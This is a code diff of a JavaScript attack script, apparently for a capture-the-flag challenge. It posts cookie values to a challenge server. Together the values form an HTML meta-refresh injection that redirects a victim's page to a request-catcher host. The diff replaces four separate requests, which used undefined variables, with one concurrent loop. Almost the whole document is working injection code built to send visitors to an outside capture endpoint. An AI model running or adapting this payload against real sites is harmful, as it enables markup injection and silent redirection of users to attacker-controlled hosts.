@@ -3,53 +3,47 @@ async function makePostRequest(url, data) {
     const response = await fetch(url, {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/x-www-form-urlencoded'
         },
-        body: JSON.stringify(data)
+        body: new URLSearchParams(data).toString()
     });
     return await response.json();
 }
-const metaCookies1 = 'a=<meta ';
-const m2 = ' http-equiv="refresh" ';
-const m3 = ' content="0' ;
-const m4 = 'url=https://hi.requestcatcher.com/">';
 
+// Define meta cookies parts
+const metaCookiesParts = [
+    'a=<meta ',
+    ' http-equiv="refresh" ',
+    ' content="0; ',
+    ' url=https://hi.requestcatcher.com/">'
+];
 
-    const url = 'http://host3.metaproblems.com:6020/index.php'; 
-    const data1 = { cookie_name: `cookie_${i}`, value: metaCookies1};
-    const data2 = { cookie_name: `cookie_${i}`, value: m2};
-    const data3 = { cookie_name: `cookie_${i}`, value: m3};
-    const data4 = { cookie_name: `cookie_${i}`, value: m4};
+const url = 'http://host3.metaproblems.com:6020/index.php';
 
-    
-    makePostRequest(url, data1)
-        .then(response => {
-            console.log(`Cookie set: ${data.cookie}=${data.value}`);
-        })
-        .catch(error => {
-            console.error('Error setting cookie:', error);
-        });
-        makePostRequest(url, data2)
-        .then(response => {
-            console.log(`Cookie set: ${data.cookie}=${data.value}`);
-        })
-        .catch(error => {
-            console.error('Error setting cookie:', error);
-        });
-        makePostRequest(url, data3)
-        .then(response => {
-            console.log(`Cookie set: ${data.cookie}=${data.value}`);
-        })
-        .catch(error => {
-            console.error('Error setting cookie:', error);
-        });
-        makePostRequest(url, data4)
-        .then(response => {
-            console.log(`Cookie set: ${data.cookie}=${data.value}`);
-        })
-        .catch(error => {
-            console.error('Error setting cookie:', error);
-        });
+// Number of requests to make
+const numRequests = 4;
 
-// Redirect to view cookie URL after setting cookies
-window.location.href = 'view_cookie_url';  // Replace with the actual URL to view cookies
+// Array to hold all POST requests
+const requests = [];
+
+// Loop to create requests
+for (let i = 0; i < numRequests; i++) {
+    const data = {
+        cookie_name: `cookie_${i + 1}`,
+        cookie_value: metaCookiesParts.join('')
+    };
+    requests.push(makePostRequest(url, data));
+}
+
+// Perform all requests concurrently using Promise.all
+Promise.all(requests)
+    .then(responses => {
+        responses.forEach((response, index) => {
+            console.log(`Cookie ${index + 1} set: ${response}`);
+        });
+        // Redirect to view cookie URL after setting cookies (assuming all requests succeeded)
+        window.location.href = 'view_cookie_url'; // Replace with actual URL
+    })
+    .catch(error => {
+        console.error('Error setting cookies:', error);
+    });
